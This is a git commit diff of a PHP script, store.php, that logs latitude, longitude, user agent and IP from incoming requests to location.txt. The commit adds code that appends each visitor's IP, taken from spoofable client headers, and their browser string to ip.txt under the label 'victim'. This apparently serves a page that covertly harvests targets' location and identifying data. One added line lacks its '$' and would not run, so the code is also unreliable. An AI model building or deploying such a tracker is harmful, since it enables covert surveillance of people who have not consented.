b0ab44f171277df836c832aac83b105d4e347901
Michael <mikeshede@gmail.com>
2024-07-10 21:18:45 +0100

    Did lots of changes and adding

--- store.php
+++ store.php
@@ -1,7 +1,36 @@
 <?php
-$myFile = fopen("location.txt", "w");
+$myFile = fopen("location.txt", "a");
 $txt = "Lat: ".$_GET["lat"]."\nLong: ".$_GET["long"]."\nUser Agent: ".$_GET["uAgent"]."\nIP: ".$_SERVER["REMOTE_ADDR"];
 fwrite($myFile, $txt);
 fclose($myFile);
 
+
+
+if (!empty($_SERVER['HTTP_CLIENT_IP']))
+    {
+      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
+    }
+elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
+    {
+      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
+    }
+else
+    {
+      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
+    }
+$useragent = " User-Agent: ";
+$browser = $_SERVER['HTTP_USER_AGENT'];
+
+
+file = 'ip.txt';
+$victim = "IP: ";
+$fp = fopen($file, 'a');
+
+fwrite($fp, $victim);
+fwrite($fp, $ipaddress);
+fwrite($fp, $useragent);
+fwrite($fp, $browser);
+
+
+fclose($fp);
 ?>
